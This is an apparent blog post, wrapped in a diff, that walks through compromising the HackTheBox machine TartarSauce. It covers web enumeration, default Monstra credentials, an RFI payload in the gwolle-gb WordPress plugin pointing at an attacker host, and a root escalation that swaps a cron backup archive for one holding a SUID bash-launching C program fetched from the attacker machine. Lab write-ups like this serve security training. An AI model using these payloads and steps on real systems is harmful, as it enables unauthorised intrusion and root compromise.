@@ -1,0 +1,311 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>TartarSauce HTB - WriteUP // 0xl3mon💀</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="0xl3mon" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://0xl3mon.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="TartarSauce HTB - WriteUP"/>
+<meta name="twitter:description" content="10.129.1.185 Nmap Recon Results Os Discovery
+TTL = 63 Linux Machine Recon Open Ports
+the unique open ports apparently is 80
+whatweb
+Web Server : Apache 2.4.8 Service Enumeration
+Fuzzing
+dirsearch -u http://10.129.1.185/ -w /usr/share/dirb/wordlists/common.txt -e &#34;php,html,txt&#34; -x &#34;400,404&#34; -F -t 100 --plain-text-report=webscan-folders we continue fuzzing the web server but this thime will be directed to the resource &ldquo;webservices&rdquo;
+dirsearch -u http://10.129.1.185/webservices/ -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -e &#34;php,html,txt&#34; -x &#34;400,404,403&#34; -F -t 100 --plain-text-report=webscan-folder-webservices we identify a new folder called &ldquo;wp&rdquo; maybe it&rsquo;s wordpress let met check"/>
+
+    <meta property="og:title" content="TartarSauce HTB - WriteUP" />
+<meta property="og:description" content="10.129.1.185 Nmap Recon Results Os Discovery
+TTL = 63 Linux Machine Recon Open Ports
+the unique open ports apparently is 80
+whatweb
+Web Server : Apache 2.4.8 Service Enumeration
+Fuzzing
+dirsearch -u http://10.129.1.185/ -w /usr/share/dirb/wordlists/common.txt -e &#34;php,html,txt&#34; -x &#34;400,404&#34; -F -t 100 --plain-text-report=webscan-folders we continue fuzzing the web server but this thime will be directed to the resource &ldquo;webservices&rdquo;
+dirsearch -u http://10.129.1.185/webservices/ -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -e &#34;php,html,txt&#34; -x &#34;400,404,403&#34; -F -t 100 --plain-text-report=webscan-folder-webservices we identify a new folder called &ldquo;wp&rdquo; maybe it&rsquo;s wordpress let met check" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xl3mon.github.io/htb/tartarsauce-htb-writeup/" />
+<meta property="article:published_time" content="2022-03-27T16:48:58+02:00" />
+<meta property="article:modified_time" content="2022-03-27T16:48:58+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://0xl3mon.github.io/"><img class="app-header-avatar" src="/avatar/panda-rose.jpg" alt="0xl3mon" /></a>
+      <h1>0xl3mon💀</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/">𝘏𝘰𝘮𝘦</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">𝘏𝘢𝘤𝘬𝘛𝘩𝘦𝘉𝘰𝘹</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">𝘈𝘣𝘰𝘶𝘵</a>
+      </nav>
+      <p>ℂ𝕪𝕓𝕖𝕣𝕊𝕖𝕔𝕦𝕣𝕚𝕥𝕪 𝔹𝕝𝕠𝕘 </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/0xl3mon" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://www.linkedin.com/in/rodrigo-flores-36847a233/" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>Linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">TartarSauce HTB - WriteUP</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Mar 27, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="101291185">10.129.1.185</h1>
+<h2 id="nmap-recon-results">Nmap Recon Results</h2>
+<p><strong>Os Discovery</strong></p>
+<p><img src="https://i.imgur.com/UroUE0I.png" alt="" title="ttl Discovery"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">TTL = 63 Linux Machine
+</code></pre></div><p><strong>Recon Open Ports</strong></p>
+<p><img src="https://i.imgur.com/os8Vg6O.png" alt="">
+the unique open ports apparently  is 80</p>
+<p><strong>whatweb</strong></p>
+<p><img src="https://i.imgur.com/DcRhYBq.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Web Server : Apache 2.4.8
+</code></pre></div><p><strong>Service Enumeration</strong></p>
+<p><img src="https://i.imgur.com/1VV7fak.png" alt="">
+<strong>Fuzzing</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://10.129.1.185/ -w /usr/share/dirb/wordlists/common.txt -e <span style="color:#e6db74">&#34;php,html,txt&#34;</span> -x <span style="color:#e6db74">&#34;400,404&#34;</span> -F -t <span style="color:#ae81ff">100</span> --plain-text-report<span style="color:#f92672">=</span>webscan-folders
+</code></pre></div><p><img src="https://i.imgur.com/v06ItnG.png" alt="" title="Dirsearch Fuzzing"></p>
+<p>we continue fuzzing the web server but this thime will be directed to the resource &ldquo;webservices&rdquo;</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://10.129.1.185/webservices/ -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -e <span style="color:#e6db74">&#34;php,html,txt&#34;</span>  -x <span style="color:#e6db74">&#34;400,404,403&#34;</span> -F -t <span style="color:#ae81ff">100</span> --plain-text-report<span style="color:#f92672">=</span>webscan-folder-webservices
+</code></pre></div><p><img src="https://i.imgur.com/4nsdaOL.png" alt="" title="Fuzzing Webservices Resources">
+we identify a new folder called &ldquo;wp&rdquo; maybe it&rsquo;s wordpress let met check</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://tartarsauce.htb/webservices/wp/
+</code></pre></div><p><img src="https://i.imgur.com/IuEViKe.png" alt=""></p>
+<p><strong>Wordpress  Enumeration</strong></p>
+<p><img src="https://i.imgur.com/yS6cmtx.png" alt="" title="wpscan ">
+as can see we discover a valid user in this case <strong>&ldquo;wpadmin&rdquo;</strong></p>
+<p><img src="https://i.imgur.com/mauMSva.png" alt="">
+The Wordpress version is <strong>4.9.3</strong> and the current theme is <strong>&ldquo;Voce&rdquo;</strong></p>
+<p><strong>Web Services Enumeration</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">http://10.129.1.185/
+</code></pre></div><p><img src="https://i.imgur.com/OISp88M.png" alt=""></p>
+<p>we try to continue enumerating wordpress but we don&rsquo;t see anything interesting and the  &ldquo;wp-login&rdquo; panel apparently does not exist then we can&rsquo;t carry out a brute force attack to see if we had any luck, we will continue with MONSTRA</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">robots.txt
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">User-agent: <span style="color:#ae81ff">\*</span>
+Disallow: /webservices/tar/tar/source/
+Disallow: /webservices/monstra-3.0.4/
+Disallow: /webservices/easy-file-uploader/
+Disallow: /webservices/developmental/
+Disallow: /webservices/phpmyadmin/
+</code></pre></div><p><strong>Enumerating Resources from robots.txt</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://tartarsauce.htb/webservices/monstra-3.0.4/
+</code></pre></div><p><img src="https://i.imgur.com/5g3b47A.png" alt="" title="Monstra"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">CMS VERSION : Monstra 3.04
+</code></pre></div><p>when we try to access in any tab we received a 404 not found, so we fuzzing the directory to ubicate possible files</p>
+<p><img src="https://i.imgur.com/Fx71Ts6.png" alt=""></p>
+<p><img src="https://i.imgur.com/NhFlAoc.png" alt=""></p>
+<p><strong>Fuzzing Monstra Folders</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://tartarsauce.htb/webservices/monstra-3.0.4/ -w /opt/Seclists/Discovery/Web-Content/raft-medium-words.txt -e <span style="color:#e6db74">&#34;php,html,txt&#34;</span> -f -x <span style="color:#e6db74">&#34;400,404,403&#34;</span> -F -t <span style="color:#ae81ff">100</span>
+</code></pre></div><p><img src="https://i.imgur.com/079vWiF.png" alt="" title="Fuzzing Monstra Folder"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://tartarsauce.htb/webservices/monstra-3.0.4/robots.txt
+</code></pre></div><p><img src="https://i.imgur.com/95pPFZZ.png" alt="" title="Robots.txt"></p>
+<p>We visit the resource &lsquo;admin&rsquo; of monstra so we find a login panel, we proceed to perform password spraying
+<img src="https://i.imgur.com/ueWffxS.png" alt=""></p>
+<p>and the valid credentials for the panel is ==admin: admin==</p>
+<p><img src="https://i.imgur.com/12qBL1L.png" alt="" title="Logged In Monstra Panelñ"></p>
+<p><strong>Vulnerability Identification</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">searchsploit monstra 3.0.4
+</code></pre></div><p><img src="https://i.imgur.com/s5XmA1q.png" alt=""></p>
+<p>We tried to exploit monstra CMS, but without luck we could not upload any files &hellip; so we continued to enumerate wordpress with aggressive enumeration methods, so we found a vulnerable plugin</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">wpscan --url http://tartarsauce.htb/webservices/wp/ -e p,u,t --plugins-detection aggressive  -t <span style="color:#ae81ff">50</span> --api-token <span style="color:#f92672">[</span>ApiToken<span style="color:#f92672">]</span>
+</code></pre></div><p><img src="https://i.imgur.com/FhaVZSb.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">gwolle-gb 4.1.2
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">searchsploit gwolle
+</code></pre></div><p><img src="https://i.imgur.com/eRei6gy.png" alt=""></p>
+<h2 id="explotation">Explotation</h2>
+<p>Vulnerable plugin allow RFI</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
+</code></pre></div><p><img src="https://i.imgur.com/lA4D1hE.png" alt="" title="Gwolle-DB Remote File Inclusion"></p>
+<p>as can see the web services try to find the file &ldquo;wp-load.php&rdquo; so we shared a file named &ldquo;wp-load.php&rdquo;</p>
+<p><strong>Reverse-Shell</strong></p>
+<p><img src="https://i.imgur.com/cmMbKfi.png" alt="" title="Reverse-shell"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><img src="https://i.imgur.com/8zWoXxg.png" alt=""></p>
+<h2 id="partial-privesc-onuma--file-read-as-root">Partial Privesc: onuma –&gt; File Read as root</h2>
+<p>As far as I know, there’s no way to exploit this box to get a root shell. But I can read files as root</p>
+<h3 id="identify-cron-with-pspy">Identify cron with pspy</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">2018/05/29 07:56:33 CMD: UID=0    PID=24065  | /bin/bash /usr/sbin/backuperer
+</code></pre></div><h4 id="usrsbinbackuperer">/usr/sbin/backuperer</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e"># Set Vars Here</span>
+ basedir<span style="color:#f92672">=</span>/var/www/html
+ bkpdir<span style="color:#f92672">=</span>/var/backups
+ tmpdir<span style="color:#f92672">=</span>/var/tmp
+ testmsg<span style="color:#f92672">=</span>/var/backups/onuma_backup_test.txt 
+ errormsg<span style="color:#f92672">=</span>/var/backups/onuma_backup_error.txt
+ tmpfile<span style="color:#f92672">=</span>/var/tmp/.<span style="color:#66d9ef">$(</span>/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d<span style="color:#e6db74">&#39; &#39;</span> -f1<span style="color:#66d9ef">)</span>
+ check<span style="color:#f92672">=</span>/var/tmp/check
+ 
+ <span style="color:#75715e"># formatting</span>
+ printbdr<span style="color:#f92672">()</span>
+ <span style="color:#f92672">{</span>
+     <span style="color:#66d9ef">for</span> n in <span style="color:#66d9ef">$(</span>seq 72<span style="color:#66d9ef">)</span>;
+     <span style="color:#66d9ef">do</span> /usr/bin/printf <span style="color:#e6db74">$&#34;-&#34;</span>;
+     <span style="color:#66d9ef">done</span>
+ <span style="color:#f92672">}</span>
+ bdr<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printbdr<span style="color:#66d9ef">)</span>
+ 
+ <span style="color:#75715e"># Added a test file to let us see when the last backup was run</span>
+ /usr/bin/printf $<span style="color:#e6db74">&#34;</span>$bdr<span style="color:#e6db74">\nAuto backup backuperer backup last ran at : </span><span style="color:#66d9ef">$(</span>/bin/date<span style="color:#66d9ef">)</span><span style="color:#e6db74">\n</span>$bdr<span style="color:#e6db74">\n&#34;</span> &gt; /var/backups/onuma_backup_error.txt
+ 
+ <span style="color:#75715e"># Cleanup from last time.</span>
+ /bin/rm -rf /var/tmp/.* /var/tmp/check
+ 
+ <span style="color:#75715e"># Backup onuma website dev files.</span>
+ /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile /var/www/html &amp;
+ 
+ <span style="color:#75715e"># Added delay to wait for backup to complete if large files get added.</span>
+ /bin/sleep <span style="color:#ae81ff">30</span>
+ 
+ <span style="color:#75715e"># Test the backup integrity</span>
+ integrity_chk<span style="color:#f92672">()</span>
+ <span style="color:#f92672">{</span>
+     /usr/bin/diff -r /var/www/html /var/tmp/check/var/www/html
+ <span style="color:#f92672">}</span>
+ 
+ /bin/mkdir /var/tmp/check
+ /bin/tar -zxvf /var/tmp/.$<span style="color:#f92672">[[</span>Sha1-Random-Value<span style="color:#f92672">]]</span> -C /var/tmp/check
+ <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>integrity_chk<span style="color:#66d9ef">)</span> <span style="color:#f92672">]]</span>
+ <span style="color:#66d9ef">then</span>
+     <span style="color:#75715e"># Report errors so the dev can investigate the issue.</span>
+     /usr/bin/printf $<span style="color:#e6db74">&#34;</span>$bdr<span style="color:#e6db74">\nIntegrity Check Error in backup last ran :  </span><span style="color:#66d9ef">$(</span>/bin/date<span style="color:#66d9ef">)</span><span style="color:#e6db74">\n</span>$bdr<span style="color:#e6db74">\n</span>$tmpfile<span style="color:#e6db74">\n&#34;</span> &gt;&gt; $errormsg
+     integrity_chk &gt;&gt; $errormsg
+     exit <span style="color:#ae81ff">2</span>
+ <span style="color:#66d9ef">else</span>
+     <span style="color:#75715e"># Clean up and save archive to the bkpdir.</span>
+     /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
+     /bin/rm -rf $check .*
+     exit <span style="color:#ae81ff">0</span>
+ <span style="color:#66d9ef">fi</span>
+
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Then the script performs the following actions.
+1. Recursively deletes the files/directories: /var/tmp/.* and /var/tmp/check.
+2. Creates a gzip file of the directory /var/www/html and saves it in the file /var/tmp/.[random-sha1-value].
+3. Sleeps for 30 seconds.
+4. Creates the directory /var/tmp/check.
+5. Changes to the directory /var/tmp/check and extract the gzip /var/tmp/.[random-sha1-value].
+6. If the files in /var/www/html are different from the files in the backup it created /var/tmp/check/var/www/html, then report error. Otherwise, move file /var/tmp/.[random-sha1-value] to /var/backups/onuma-wwww-dev.bak and remove everything in the check directory and any files that start with the character “.”. Those would be the backup .[random-sha1-value] files it created.
+</code></pre></div><p>The exploit for this is not very intuitive so bear with me as I try to explain it. When the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. We can use these 30 seconds to replace the backup tar file that the script created with our own malicious file.
+After the 30 seconds pass, it will create a directory called “check” and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the backuperer program is run again and our files get deleted.</p>
+<p>The way we’re going to escalate privileges is by creating our own compressed file that contains an SUID executable.
+Hopefully that makes some sense. Let’s start our attack.
+First, create the directory var/www/html in our attack machine. Then place the following <strong>setuid.c</strong> program file in the directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    setuid(<span style="color:#ae81ff">0</span>);
+    execl(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>, <span style="color:#e6db74">&#34;bash&#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)NULL);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p>Compile the program.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">gcc -m32 -o setuid setuid.c
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">-m32: 32 bit architecture since the target machine is running a 32 bit os
+-o: output file
+</code></pre></div><p>Then set the SUID bit on the compiled program.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@kali:~/Desktop/var/www/html# chmod u+s setuid
+root@kali:~/Desktop/bla1/var/www/html# ls -la
+total <span style="color:#ae81ff">24</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 11:24 .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 10:09 ..
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15532</span> Jan <span style="color:#ae81ff">18</span> 11:24 setuid
+</code></pre></div><p>Since we’re running as root in kali (our attack machine), the owner of the file is root and therefore the SUID bit allows a non-privileged user to execute the file with root privileges.</p>
+<ul>
+<li>
+<p>Now compress the entire var directory and save it in the file exploit.
+<code>tar -zcvf exploit var</code></p>
+</li>
+<li>
+<p>Set up a python server on your attack machine.
+<code>python -m SimpleHTTPServer 5555</code></p>
+</li>
+</ul>
+<p>On your target machine, download the compressed exploit file in the directory /var/tmp.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.10.14.12:5555/exploit
+</code></pre></div><p>Now wait for the backuperer scheduled service to run and create the backup file. We know this happens every 5 minutes. To view how much time is left before the scheduled service is going to run again, use the following command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">systemctl list-timers
+</code></pre></div><p>When the service is run, view the content of the directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">onuma@TartarSauce:/var/tmp$ ls -la
+total <span style="color:#ae81ff">11280</span>
+drwxrwxrwt  <span style="color:#ae81ff">8</span> root  root      <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:01 .
+drwxr-xr-x <span style="color:#ae81ff">14</span> root  root      <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2018</span> ..
+-rw-r--r--  <span style="color:#ae81ff">1</span> onuma onuma <span style="color:#ae81ff">11511681</span> Jan <span style="color:#ae81ff">18</span> 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
+-rw-r--r--  <span style="color:#ae81ff">1</span> onuma onuma     <span style="color:#ae81ff">2765</span> Jan <span style="color:#ae81ff">18</span> 11:46 exploit
+drwx------  <span style="color:#ae81ff">3</span> root  root      <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2018</span> systemd-private-46248d8045bf434cba7dc7496b9776d4-systemd-timesyncd.service-en3PkS
+drwx------  <span style="color:#ae81ff">3</span> root  root      <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 20:41 systemd-private-6490911d22fe49afb4fe34c1971285c9-systemd-timesyncd.service-5H4XIC
+</code></pre></div><p>The program generated backup compressed file is <strong>&quot;.e84f0****.&quot;</strong> Replace it with our exploit file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">cp exploit .e84f032e69e2e221528b5c1c2ea7fa946a905584
+</code></pre></div><p>Now we just have to wait for 30 seconds (sleep time) before the &ldquo;<strong>.e84f0***</strong>&rdquo; tar file (which is really our exploit file) is decompressed and saved in the directory check.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">onuma@TartarSauce:/var/tmp$ ls -la
+total <span style="color:#ae81ff">44</span>
+drwxrwxrwt  <span style="color:#ae81ff">9</span> root  root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:01 .
+drwxr-xr-x <span style="color:#ae81ff">14</span> root  root  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2018</span> ..
+-rw-r--r--  <span style="color:#ae81ff">1</span> onuma onuma <span style="color:#ae81ff">2765</span> Jan <span style="color:#ae81ff">18</span> 21:01 .e84f032e69e2e221528b5c1c2ea7fa946a905584
+drwxr-xr-x  <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 21:01 check
+-rw-r--r--  <span style="color:#ae81ff">1</span> onuma onuma <span style="color:#ae81ff">2765</span> Jan <span style="color:#ae81ff">18</span> 11:46 exploit
+</code></pre></div><p>Enter the /check/var/www/html directory.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">onuma@TartarSauce:/var/tmp$ cd check/var/www/html/
+onuma@TartarSauce:/var/tmp/check/var/www/html$ ls -la
+total <span style="color:#ae81ff">24</span>
+drwxr-xr-x <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 11:24 .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">18</span> 10:09 ..
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">15532</span> Jan <span style="color:#ae81ff">18</span> 11:24 setuid
+</code></pre></div><p>There we’ll see our setuid program with the SUID bit set! The reason the program still has the SUID bit set, is because when the compressed file was decompressed, it was
+decompressed with root privileges (the privileges the program was running with) and therefore, the permissions on the file were preserved.
+Run the setuid program.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">onuma@TartarSauce:/var/tmp/check/var/www/html$ ./setuid
+root@TartarSauce:/var/tmp/check/var/www/html# whoami
+root
+</code></pre></div><p>We are root! Grab the root.txt flag.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
